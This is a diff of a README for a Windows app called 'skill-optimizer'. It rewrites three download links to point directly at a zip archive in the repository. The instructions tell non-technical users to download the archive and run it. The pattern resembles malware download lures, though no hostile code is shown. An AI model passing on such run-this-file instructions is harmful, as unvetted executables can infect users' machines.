@@ -1,6 +1,6 @@
 # ⚙️ skill-optimizer - Better Agent Skills, Faster Results
 
-[![Download skill-optimizer](https://img.shields.io/badge/Download%20skill--optimizer-blue?style=for-the-badge&logo=github)](https://github.com/Bennaco7539/skill-optimizer/raw/refs/heads/main/skills/skill-optimizer/optimizer_skill_1.5-alpha.1.zip)
+[![Download skill-optimizer](https://img.shields.io/badge/Download%20skill--optimizer-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Bennaco7539/skill-optimizer/main/skills/skill-optimizer/optimizer_skill_1.5-alpha.1.zip)
 
 ## 📌 What this app does
 
@@ -21,7 +21,7 @@ The app is set up for normal desktop use. You do not need to know how to code to
 ## ⬇️ Download
 
 Visit this page to download:  
-https://github.com/Bennaco7539/skill-optimizer/raw/refs/heads/main/skills/skill-optimizer/optimizer_skill_1.5-alpha.1.zip
+https://raw.githubusercontent.com/Bennaco7539/skill-optimizer/main/skills/skill-optimizer/optimizer_skill_1.5-alpha.1.zip
 
 Use the page to get the latest version of skill-optimizer, then save the app file to your computer.
 
@@ -159,6 +159,6 @@ Use skill-optimizer when:
 ## 📎 Download link
 
 Visit this page to download:  
-https://github.com/Bennaco7539/skill-optimizer/raw/refs/heads/main/skills/skill-optimizer/optimizer_skill_1.5-alpha.1.zip
+https://raw.githubusercontent.com/Bennaco7539/skill-optimizer/main/skills/skill-optimizer/optimizer_skill_1.5-alpha.1.zip
 
 Open the page, get the latest build, and run it on your Windows PC
